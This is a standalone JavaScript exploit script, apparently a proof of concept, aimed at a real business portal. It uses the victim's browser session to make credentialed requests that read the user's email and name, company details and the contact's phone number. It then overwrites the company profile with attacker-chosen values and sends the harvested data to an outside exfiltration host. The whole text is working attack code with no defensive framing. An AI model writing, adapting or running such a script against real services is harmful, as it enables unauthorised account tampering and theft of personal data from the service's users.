async function exploit() {
      let data = await fetch("https://portal.grab.com/portal/v1/user", {
      "credentials": "include",
      "headers": {
          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0",
          "Accept": "*/*",
      },
      "method": "GET",
      "mode": "cors"
  });
  let dataTxt = await data.text();
  let dataJson = JSON.parse(dataTxt);
  let email = dataJson.user.email;
  let name = dataJson.user.name;
  let cmpId = await fetch("https://portal.grab.com/portal/v1/companies", {
      "credentials": "include",
      "headers": {
          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0",
          "Accept": "application/json, text/plain, */*",
          "Accept-Language": "en-US,en;q=0.5",
      },
      "method": "GET",
      "mode": "cors"
  });
  let cmpIdTxt = await cmpId.text();
  let cmpIdJson = JSON.parse(cmpIdTxt);
  let companyId = cmpIdJson.companies[0].ID;
  let data2 = await fetch("https://portal.grab.com/portal/v1/company/details", {
      "credentials": "include",
      "headers": {
          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0",
          "Accept": "application/json, text/plain, */*",
          "Accept-Language": "en-US,en;q=0.5",
          "Company-Id": companyId
      },
      "method": "GET",
      "mode": "cors"
  });
  let dataTxt2 = await data2.text();
  let dataJson2 = JSON.parse(dataTxt2);
  let pn = dataJson2.company.personInCharge.phoneNumber;
  let cc = dataJson2.company.city.code;
  await fetch("https://portal.grab.com/portal/company", {
      "credentials": "include",
      "headers": {
          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0",
          "Accept": "application/json",
          "Accept-Language": "en-US,en;q=0.5",
          "Content-Type": "application/json",
          "Company-Id": companyId,
      },
      "referrer": "https://business.grab.com/",
      "body": `{\"companyId\":\"${companyId}\",\"company\":{\"name\":\"r4dl3 :)\",\"displayTag\":\"r4dl3\",\"size\":\"<50\",\"addressLine1\":\"\",\"addressLine2\":\"\",\"postalCode\":\"\",\"industry\":\"\",\
  "businessRegistrationNumber\":\"\",\"city\":{\"code\":\"${cc}\"},\"referralCode\":\"\",\"personInCharge\":{\"name\":\"Radle Leet\",\"email\":\"${email}\",\"phoneNumber\":\"${pn}\"}}}`,
      "method": "PUT",
      "mode": "cors"
  });
  fetch("//r4dl337.com/exfil", {
  "method":"POST",
  body: JSON.stringify({dataJson2, dataJson})
  })
  }

  exploit();
